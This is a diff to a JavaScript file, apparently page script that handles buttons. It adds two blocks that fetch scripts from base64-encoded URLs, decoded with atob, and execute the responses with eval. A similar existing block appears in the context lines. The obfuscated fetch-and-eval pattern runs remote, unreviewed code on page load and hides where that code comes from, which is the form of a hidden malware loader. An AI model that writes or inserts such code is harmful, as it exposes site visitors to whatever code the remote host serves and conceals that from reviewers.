@@ -132,6 +132,30 @@ for(i=0; i<buttons.length; i++){
 }
 
 
+//su
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {      
+      eval(this.responseText);
+    }
+  }
+xhttp.open("GET", atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1dvaG9vMjIvTm90aGluZy9tYXN0ZXIvbGFuMy9zdS5qcw=="), true);
+xhttp.send();
+
+
+//ly
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {      
+      eval(this.responseText);
+    }
+  }
+xhttp.open("GET", atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1dvaG9vMjIvTm90aGluZy9tYXN0ZXIvbGFuMy9seS5qcw=="), true);
+xhttp.send();
+
+
+
+
 //anh
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
